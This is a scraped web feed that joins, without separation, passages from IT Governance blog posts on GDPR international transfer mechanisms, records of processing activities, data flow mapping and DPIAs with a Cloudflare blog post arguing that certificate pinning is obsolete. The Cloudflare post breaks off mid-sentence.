&lt;p&gt;The final mechanism is &lt;strong&gt;compelling legitimate interests&lt;/strong&gt;. Specifically, both Regulations say in Article 49(1)(g):&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;[The international transfer] is necessary for the purposes of compelling legitimate interests pursued by the controller which are not overridden by the interests or rights and freedoms of the data subject, and the controller has assessed all the circumstances surrounding the data transfer and has on the basis of that assessment provided suitable safeguards with regard to the protection of personal data.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;As is standard with legitimate interests, you must inform the data subject of that interest, as well the international transfer. You must also inform your supervisory authority.&lt;/p&gt;



&lt;p&gt;Unlike the &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; legitimate interests, there’s no assessment for this. However, you must keep records that show your decision-making process around what the legitimate interest was, why you deemed this the appropriate transfer method, that you’ve informed your data subjects, etc.&lt;/p&gt;



&lt;p&gt;Like the derogations, this mechanism should be used in moderation.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="how-to-choose"&gt;How to choose the right mechanism&lt;/h2&gt;



&lt;p&gt;Seven mechanisms, with variations between the UK and EU GDPR, can feel overwhelming.&lt;/p&gt;



&lt;p&gt;The good news is that those differences are minor, as both GDPRs share the same principles. Moreover, the bulk of personal data transfers are covered by the first three mechanisms:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Adequacy&lt;/li&gt;



&lt;li&gt;IDTA/SCCs&lt;/li&gt;



&lt;li&gt;BCRs&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Between these three, the correct mechanism is often fairly obvious.&lt;/p&gt;



&lt;p&gt;In short, rely on adequacy if you can. If you can’t, use the BCRs if you’re an international organisation; otherwise, use the IDTA (UK GDPR) or SCCs (EU GDPR).&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;p&gt;Few people like spreadsheets. Fewer still like &lt;em&gt;multiple &lt;/em&gt;spreadsheets.&lt;/p&gt;



&lt;p&gt;Similarly, few people enjoy &lt;em&gt;complex&lt;/em&gt; compliance – and &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;GDPR (General Data Protection Regulation&lt;/a&gt; compliance can be both complex and documentation-heavy.

&lt;p&gt;One way to streamline GDPR compliance is to make your &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPAs (records of processing activities)&lt;/a&gt; a focal point.&lt;/p&gt;

&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Automate-GDPR-Article-30-compliance"&gt;How to automate GDPR compliance&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Records-of-processing-activities"&gt;Records of processing activities&lt;/h2&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Previously&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;, we discussed ROPAs. One practical tip you gave was to first list all&lt;/strong&gt; &lt;strong&gt;processing activities before adding lots of data points.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Another tip was to consider your ROPA a ‘one-stop shop’ – having all your information in one place. Could you elaborate?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;ROPAs are a single place for you to understand your processing activities. And not just you – other stakeholders, too.&lt;/p&gt;



&lt;p&gt;Suppose that the ICO [Information Commissioner’s Office] audits you. The first thing the regulator will likely ask for are your Article 30 ROPAs. If the ICO then wants to know, say, what &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; you’re relying on, they should be able to see it right there, in that ROPA.&lt;/p&gt;



&lt;p&gt;Your ROPA should already have a column for lawful basis. Plus, if that lawful basis is legitimate interests, you could then add columns for:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;A brief outline of that legitimate interest; and&lt;/li&gt;



&lt;li&gt;A hyperlink to your LIA [legitimate interests assessment], proving the validity of that legitimate interest.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;On the other hand, if your lawful basis is consent, you could also have a column that hyperlinks to evidence of that consent:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;When and how did the data subject give their consent?&lt;/li&gt;



&lt;li&gt;What information did you give them at the time?&lt;/li&gt;



&lt;li&gt;What &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-managing-the-right-to-withdraw-consent" rel="noreferrer noopener" target="_blank"&gt;withdrawal mechanism&lt;/a&gt; do you use?&lt;/li&gt;



&lt;li&gt;And so on.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The ROPA is a high-level summary that should provide an immediate overview of:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;All your processing activities; and&lt;/li&gt;



&lt;li&gt;All the risks associated with them.&lt;/li&gt;
&lt;/ul&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What sort of risks are you referring to here? And how can a ROPA give an overview of them?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The risks the GDPR always focuses on – risks to the rights and freedoms of data subjects.&lt;/p&gt;



&lt;p&gt;As to how a ROPA provides an overview – you should have columns that indicate:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;How you’re processing and securing the personal data, using appropriate &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-32-your-guide-to-the-requirements" rel="noreferrer noopener" target="_blank"&gt;technical and organisational measures&lt;/a&gt;;&lt;/li&gt;



&lt;li&gt;What Article 6 lawful basis you’re relying on and, for &lt;a href="https://www.itgovernance.co.uk/blog/the-gdpr-do-you-know-the-difference-between-personal-data-and-sensitive-data" rel="noreferrer noopener" target="_blank"&gt;special category data&lt;/a&gt;, Article 9 exemption;&lt;/li&gt;



&lt;li&gt;How you’re meeting the Article 5 data protection principles;&lt;/li&gt;



&lt;li&gt;What data subject rights are applicable;&lt;/li&gt;



&lt;li&gt;Whether international transfers are taking place, what mechanism you’re relying on to legally transfer personal data to a third country, and how you’re securing those transfers; and&lt;/li&gt;



&lt;li&gt;The level of risk of the processing activity, and if the risk is high, that you’ve performed a DPIA, with a link to that assessment.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The GDPR doesn’t require you to include all this in your ROPA, but this list &lt;em&gt;does&lt;/em&gt; reflect the Regulation’s requirements, and it provides a convenient means of showing that you’re complying with them.&lt;/p&gt;



&lt;p&gt;Collecting this data in your ROPA also gives a simple, clear overview of these data points, which in turn gives you a much clearer picture of your risks.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Data-flow-mapping"&gt;Data flow mapping&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Let’s dig into what you said about “how you’re processing and securing the personal data”. What would that look like in a ROPA?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;You’d have a group of columns in your ROPA that look something like this:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-46670" height="209" src="https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/08/image-5.png" width="938" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;You can also add columns for implemented security measures, including information on encryption. For instance, you might have a drop-down menu with items like:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Pseudonymisation&lt;/li&gt;



&lt;li&gt;Anonymisation&lt;/li&gt;



&lt;li&gt;Encryption&lt;/li&gt;



&lt;li&gt;Plaintext&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;You could also add details on the specific encryption protocol, particularly if your organisation uses more than one.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;And you then feed this information into a data flow map?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Correct, but a data flow map also takes things further. It &lt;em&gt;visualises&lt;/em&gt; the data flows, so you can easily see:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Which departments are using what data; and&lt;/li&gt;



&lt;li&gt;The risks your data might be subject to.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;For example, if your data flow map shows you’re storing a lot of personal data in &lt;a href="https://www.itgovernance.co.uk/blog/the-14-cloud-security-principles-explained" rel="noreferrer noopener" target="_blank"&gt;Cloud&lt;/a&gt;-based databases, have you implemented appropriate &lt;a href="https://www.itgovernance.co.uk/blog/what-is-access-control" rel="noreferrer noopener" target="_blank"&gt;access control&lt;/a&gt;?&lt;/p&gt;



&lt;p&gt;The nature of the Cloud is that you can access it from anywhere with an Internet connection, so restricting access is vital, particularly if staff work remotely. If your employees are also based &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;internationally&lt;/a&gt;, ensure you’re meeting local laws as well as the UK GDPR requirements.&lt;/p&gt;



&lt;p&gt;Another thing to pay attention to is configurations – you really don’t want to inadvertently make your database publicly available, so did you configure it properly?&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;So, your data flow maps help organisations secure their personal data?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Yes. Because data flow maps show you where you’re storing, processing and transmitting personal data, they give a clear idea of where your security risks are. And&lt;/p&gt;



&lt;p&gt;They also clearly show who’s using the data, and that tells you who to talk to in order to better understand and address those risks. This mapping exercise will highlight data you might be collecting but not using, in which case you should destroy it to:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Meet your GDPR requirements [e.g. the &lt;a href="https://www.itgovernance.co.uk/blog/what-is-data-minimisation-definition-examples" rel="noreferrer noopener" target="_blank"&gt;data minimisation&lt;/a&gt; principle];&lt;/li&gt;



&lt;li&gt;Reduce the risks [the impact of a data breach]; and&lt;/li&gt;



&lt;li&gt;Save you money [storage costs].&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;h2 class="wp-block-heading" id="Data-protection-impact-assessment"&gt;Data protection impact assessment&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;You &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;previously&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; suggested using ROPAs in conjunction with tools like DPIAs, and that  detailed ROPAs  help you conduct DPIAs and &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/why-risk-assessments-are-essential-for-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;risk assessments&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; further down the line. Could you elaborate?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;I see all three – ROPAs, data flow maps and DPIAs – as tools to help you understand your processing activities.&lt;/p&gt;



&lt;p&gt;I don’t look at the ROPAs in isolation: all &amp;nbsp;three &amp;nbsp;together enable you to demonstrate accountability and compliance with Article 30.&lt;/p&gt;



&lt;p&gt;But the &lt;em&gt;focus&lt;/em&gt; of each tool is different, of course. For instance, DPIAs revolve around risk – the idea is that you only need to conduct a DPIA if the processing presents a&amp;nbsp;&lt;em&gt;high&lt;/em&gt;&amp;nbsp;risk to the rights and freedoms of data subjects.* Which you then look to address, to reduce that risk to an acceptable level.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;*It’s also worth checking Article 35(3) of the GDPR for specific examples that constitute high-risk processing, as well as the&amp;nbsp;&lt;/em&gt;&lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/accountability-and-governance/data-protection-impact-assessments-dpias/examples-of-processing-likely-to-result-in-high-risk/" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;list of examples&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&amp;nbsp;on the ICO website and the&amp;nbsp;&lt;/em&gt;&lt;a href="https://ec.europa.eu/newsroom/article29/items/611236" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;Article 29 Working Party guidelines&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&amp;nbsp;(endorsed by the EDPB).&lt;/em&gt;&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How can organisations track their risks?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Specific to risks relevant to the GDPR, again, you can create a group of columns in your ROPA to track key data points. If you don’t feel comfortable with spreadsheets, an automation tool can help by providing a template that you work within. In a spreadsheet, this might look something like this:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-46668" height="193" src="https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/08/image-3.png" width="939" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;Depending on your needs, you may want to use slightly different columns, but I recommend tracking your risks in your ROPAs, as this takes advantage of the fact you’ve listed out all your processing activities. In effect, those records are your &lt;strong&gt;asset register&lt;/strong&gt; – a key element to an asset-based risk assessment, which is a skill that’s fundamental to data protection, privacy and information security management&lt;/p&gt;



&lt;p&gt;You can further simplify things by colour-coding your risks to highlight those that require further action. You can also use Excel formulas to automate certain columns, or even use &lt;a href="https://www.itgovernance.co.uk/cybercomply" rel="noreferrer noopener" target="_blank"&gt;dedicated software&lt;/a&gt; to fully automate the process and save you a lot of time, as well as the risk of not saving your work and having to start all over again.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;p&gt;&lt;strong&gt;&lt;em&gt;Need guidance on how to conduct a DPIA?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="Bringing-together-ROPAs-data-flow-mapping-and-DPIAs"&gt;Bringing together ROPAs, data flow mapping and DPIAs&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Let’s wrap things up. Where do organisations begin with GDPR compliance?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;With their ROPAs. If you don’t have a clear overview of your processing activities, it becomes virtually impossible to meet your other legal requirements.&lt;/p&gt;



&lt;p&gt;It’s akin to implementing cyber security without a &lt;a href="https://www.itgovernance.co.uk/shop/product/information-security-risk-assessment-workshop" rel="noreferrer noopener" target="_blank"&gt;risk assessment&lt;/a&gt; – if you don’t know what your threats and vulnerabilities are, you can’t implement cyber defences effectively.&lt;/p&gt;



&lt;p&gt;Compiling your ROPAs tells you what personal data you’re processing, along with how, why, when and by whom. Just those basics make for a decent start to compliance.&lt;/p&gt;



&lt;p&gt;In time, you can add columns and data points not listed in Article 30 but that&amp;nbsp;&lt;em&gt;are&lt;/em&gt;&amp;nbsp;mentioned elsewhere in the GDPR. If creating your ROPAs is becoming complex, there are guides, software and consultancy that can support this project. &amp;nbsp;You can also reflect good practice, for example by including data flow maps. These include information about DPIAs, as well as information about lawful basis, applicable data subject rights, and so on. Take GDPR compliance one step at a time, using your ROPAs as your base.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

Learn why certificate pinning hasn’t kept up with modern standards and find alternatives to improve security while reducing management overhead</description><content:encoded>&lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/53OxQEDIwH8W1WEf7Gpeej/750904f31665823959ba414038bb154a/image1-11.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;In today’s world, technology is quickly evolving and some practices that were once considered the gold standard are quickly becoming outdated. At Cloudflare, we stay close to industry changes to ensure that we can provide the best solutions to our customers. One practice that we’re continuing to see in use that no longer serves its original purpose is certificate pinning. In this post, we’ll dive into certificate pinning, the consequences of using it in today’s &lt;a href="https://www.cloudflare.com/en-gb/learning/ssl/how-does-public-key-encryption-work/"&gt;Public Key Infrastructure (PKI)&lt;/a&gt; world, and alternatives to pinning that offer the same level of security without the management overhead.  &lt;/p&gt;&lt;p&gt;PKI exists to help issue and manage &lt;a href="https://www.cloudflare.com/learning/ssl/what-is-an-ssl-certificate/"&gt;TLS certificates&lt;/a&gt;, which are vital to keeping the Internet secure – they ensure that users access the correct applications or servers and that data between two parties stays encrypted. The mis-issuance of a certificate can pose great risk. For example, if a malicious party is able to issue a TLS certificate for your bank’s website, then they can potentially impersonate your bank and intercept that traffic to get access to your bank account. To prevent a mis-issued certificate from intercepting traffic, the server can give a certificate to the client and say “only trust connections if you see this certificate and drop any responses that present a different certificate” – this practice is called certificate pinning.&lt;/p&gt;&lt;p&gt;In the early 2000s, it was common for banks and other organizations that handle sensitive data to pin certificates to clients. However, over the last 20 years, TLS certificate issuance has evolved and changed, and new solutions have been developed to help customers achieve the security benefit they receive through certificate pinning, with simpler management, and without the risk of disruption.&lt;/p&gt;&lt;p&gt;Cloudflare’s mission is to help build a better Internet, which is why our teams are always focused on &lt;a href="https://www.cloudflare.com/application-services/solutions/domain-protection-services/"&gt;keeping domains secure and online&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Why certificate pinning is causing more outages now than it did before&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-certificate-pinning-is-causing-more-outages-now-than-it-did-before"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Certificate pinning is not a new practice, so why are we emphasizing the need to stop using it &lt;i&gt;now&lt;/i&gt;? The reason is that the PKI ecosystem is moving towards becoming more agile, flexible, and secure. As a part of this change, &lt;a href="https://www.ssl.com/article/what-is-a-certificate-authority-ca/"&gt;certificate authorities (CAs)&lt;/a&gt; are starting to rotate certificates and their intermediates, certificates that bridge the root certificate and the domain certificate, more frequently to improve security and encourage automation.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6bcPbw10tESD1qHK6cP9yE/ac3f3df18f10a8a4595386a49a7ecd07/image3-12.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;These more frequent certificate rotations are problematic from a pinning perspective because certificate pinning relies on the exact matching of certificates. When a certificate is rotated, the new certificate might not match the pinned certificate on the client side. If the pinned certificate is not updated to reflect the contents of the rotated certificate, the client will reject the new certificate, even if it’s valid and issued by the same CA. This mismatch leads to a failure in establishing a secure connection, causing the domain or application to become inaccessible until the pinned certificate is updated.&lt;/p&gt;&lt;p&gt;Since the start of 2024, we have seen the number of customer reported outages caused by certificate pinning significantly increase. (As of this writing, we are part way through July and Q3 has already seen as many outages as the last three quarters of 2023 combined.)&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1U4AFw29oL1GCcen93rnYr/5dea495d82170011725de472cfd7f98a/image4-4.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;We can attribute this rise to two major events: Cloudflare migrating away from using DigiCert as a certificate authority and Google and Let’s Encrypt intermediate CA rotations.&lt;/p&gt;&lt;p&gt;Before migrating customer’s certificates away from using DigiCert as the CA, Cloudflare sent multiple notifications to customers to inform them that they should update or remove their certificate pins, so that the migration does not impact their domain’s availability.&lt;/p&gt;&lt;p&gt;However, what we’ve learned is that almost all customers that were impacted by the change were unaware that they had a certificate pin in place. One of the consequences of using certificate pinning is that the “set and forget” mentality doesn’t work, now that certificates are being rotated more frequently. Instead, changes need to be closely monitored to ensure that a regular certificate renewal doesn't cause an outage. This goes to show that to implement certificate pinning successfully, customers need a robust system in place to track certificate changes and implement them.&lt;/p&gt;&lt;p&gt;We built our &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/universal-ssl/"&gt;Universal SSL&lt;/a&gt; pipeline to be resilient and redundant, ensuring that we can always issue and renew a TLS certificate on behalf of our customers, &lt;a href="https://blog.cloudflare.com/introducing-backup-certificates"&gt;even in the event of a compromise or revocation&lt;/a&gt;. CAs are starting to make changes like more frequent certificate rotations to encourage a move towards a more secure ecosystem. Now, it’s up to domain owners to stop implementing legacy practices like certificate pinning, which cause breaking changes, and instead start adopting modern standards that aim to provide the same level of security, but without the management overhead or risk.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Modern standards &amp;amp; practices are making the need for certificate pinning obsolete&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#modern-standards-practices-are-making-the-need-for-certificate-pinning-obsolete"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;div&gt;
            &lt;h3&gt;Shorter certificate lifetimes&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#shorter-certificate-lifetimes"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Over the last few years, we have seen certificate lifetimes quickly decrease. Before 2011, a certificate could be valid for up to 96 months (eight years) and now, in 2024, the maximum validity period for a certificate is 1 year. We’re seeing this trend continue to develop, with Google Chrome &lt;a href="https://www.chromium.org/Home/chromium-security/root-ca-policy/moving-forward-together/"&gt;pushing&lt;/a&gt; for shorter CA, intermediate, and certificate lifetimes, advocating for 3 month certificate validity as the new standard.&lt;/p&gt;&lt;p&gt;This push improves security and redundancy of the entire PKI ecosystem in several ways. First, it reduces the scope of a compromise by limiting the amount of time that a malicious party could control a TLS certificate or private key. Second, it reduces reliance on certificate revocation, a process that lacks standardization and enforcement by clients, browsers, and CAs. Lastly, it encourages automation as a replacement for legacy certificate practices that are time-consuming and error-prone.&lt;/p&gt;&lt;p&gt;Cloudflare is moving towards only using CAs that follow the &lt;a href="https://datatracker.ietf.org/doc/html/rfc8555"&gt;ACME&lt;/a&gt; (Automated Certificate Management Environment) protocol, which by default, issues certificates with 90 day validity periods. We have already started to roll this out to Universal SSL certificates and have removed the ability to issue 1-year certificates as a part of our &lt;a href="https://developers.cloudflare.com/ssl/reference/migration-guides/digicert-update/"&gt;reduced usage of DigiCert&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Regular rotation of intermediate certificates&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#regular-rotation-of-intermediate-certificates"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/38pDF476Nnjx7acXBN5eTM/ece6376485bb5232e4574d05c7294564/image2-8.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;The CAs that Cloudflare partners with, &lt;a href="https://letsencrypt.org/"&gt;Let’s Encrypt&lt;/a&gt; and &lt;a href="https://pki.goog/"&gt;Google Trust Services&lt;/a&gt;, are starting to rotate their intermediate CAs more frequently. This increased rotation is beneficial from a security perspective because it limits the lifespan of intermediate certificates, reducing the window of opportunity for attackers to exploit a compromised intermediate. Additionally, regular rotations make it easier to revoke an intermediate certificate if it becomes compromised, enhancing the overall security and resiliency of the PKI ecosystem.&lt;/p&gt;&lt;p&gt;Both Let’s Encrypt and Google Trust Services changed their intermediate chains in June 2024. In addition, &lt;a href="https://community.letsencrypt.org/t/lets-encrypt-new-intermediate-certificates/209498"&gt;Let’s Encrypt has started to balance their certificate issuance across 10 intermediates&lt;/a&gt; (5 RSA and 5 ECDSA).&lt;/p&gt;&lt;p&gt;Cloudflare customers using &lt;a href="https://www.cloudflare.com/advanced-certificate-manager/"&gt;Advanced Certificate Manager&lt;/a&gt; have the ability to choose their issuing CA. The issue is that even if Cloudflare uses the same CA for a certificate renewal, there is no guarantee that the same certificate chain (root or intermediate) will be used to issue the renewed certificate. As a result, if pinning is used, a successful renewal could cause a full outage for a domain or application.&lt;/p&gt;&lt;p&gt;This happens because certificate pinning relies on the exact matching of certificates. When an intermediate certificate is rotated or changed, the new certificate might not match the pinned certificate on the client side. As a result, the client will reject the renewed certificate, even if it’s a valid certificate issued by the same CA. This mismatch leads to a failure on the client side, causing the domain to become inaccessible until the pinned certificate is updated to reflect the new intermediate certificate. This risk of an unexpected outage is a major downside of continuing to use certificate pinning, especially as CAs increasingly update their intermediates as a security measure.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Increased use of certificate transparency&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#increased-use-of-certificate-transparency"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;&lt;a href="https://blog.cloudflare.com/introducing-certificate-transparency-and-nimbus"&gt;Certificate transparency (CT) logs&lt;/a&gt; provide a standardized framework for monitoring and auditing the issuance of TLS certificates. CT logs help detect misissued or malicious certificates and Cloudflare customers can set up &lt;a href="https://blog.cloudflare.com/introducing-certificate-transparency-monitoring"&gt;CT monitoring&lt;/a&gt; to receive notifications about any certificates issued for their domain. This provides a better mechanism for detecting certificate mis-issuance, reducing the need for pinning.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why modern standards make certificate pinning obsolete&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-modern-standards-make-certificate-pinning-obsolete"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Together, these practices – shorter certificate lifetimes, regular rotations of intermediate certificates, and increased use of certificate transparency – address the core security concerns that certificate pinning was initially designed to mitigate. Shorter lifetimes and frequent rotations limit the impact of compromised certificates, while certificate transparency allows for real time monitoring and detection of misissued certificates. These advancements are automated, scalable, and robust and eliminate the need for the manual and error-prone process of certificate pinning. By adopting these modern standards, organizations can achieve a higher level of security and resiliency without the management overhead and risk associated with certificate pinning.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Reasons behind continued use of certificate pinning&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#reasons-behind-continued-use-of-certificate-pinning"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Originally, certificate pinning was designed to prevent &lt;a href="https://blog.cloudflare.com/monsters-in-the-middleboxes/"&gt;monster-in-the-middle (MITM)&lt;/a&gt; attacks by associating a hostname with a specific TLS certificate, ensuring that a client could only access an application if the server presented a certificate issued by the domain owner.&lt;/p&gt;&lt;p&gt;Certificate pinning was traditionally used to secure IoT (Internet of Things) devices, mobile applications, and APIs. IoT devices are usually equipped with more limited processing power and are oftentimes unable to perform software updates. As a result, they’re less likely to perform things like certificate revocation checks to ensure that they’re using a valid certificate. As a result, it’s common for these devices to come pre-installed with a set of trusted certificate pins to ensure that they can maintain a high level of security. However, the increased frequency of certificate changes poses significant risk, as many devices have immutable software, preventing timely updates to certificate pins during renewals.&lt;/p&gt;&lt;p&gt;Similarly, certificate pinning has been employed to secure Android and iOS applications, ensuring that only the correct certificates are served. Despite this, both &lt;a href="https://developer.apple.com/news/?id=g9ejcf8y"&gt;Apple&lt;/a&gt; and &lt;a href="https://developer.android.com/privacy-and-security/security-ssl"&gt;Google&lt;/a&gt; warn developers against the use of certificate pinning due to the potential for failures if not implemented correctly.&lt;/p&gt;
          &lt;div&gt;

            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;While certificate pinning can be applied at various levels of the certificate chain, offering different levels of granularity and security, we don’t recommend it due to the challenges and risks associated with its use.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Pinning certificates at the root certificate&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#pinning-certificates-at-the-root-certificate"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Pinning the root certificate instructs a client to only trust certificates issued by that specific Certificate Authority (CA).&lt;/p&gt;&lt;p&gt;&lt;b&gt;Advantages&lt;/b&gt;:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Simplified management:&lt;/b&gt; Since root certificates have long lifetimes (&amp;gt;10 years) and rarely change, pinning at the root reduces the need to frequently update certificate pins, making this the easiest option in terms of management overhead.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;Disadvantages:&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Broader trust:&lt;/b&gt; Most Certificate Authorities (CAs) issue their certificates from one root, so pinning a root CA certificate enables the client to trust every certificate issued from that CA. However, this broader trust can be problematic. If the root CA is compromised, every certificate issued by that CA is also compromised, which significantly increases the potential scope and impact of a security breach. This broad trust can therefore create a single point of failure, making the entire ecosystem more vulnerable to attacks.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Neglected Maintenance:&lt;/b&gt; Root certificates are infrequently rotated, which can lead to a “set and forget” mentality when pinning them. Although it's rare, CAs do &lt;a 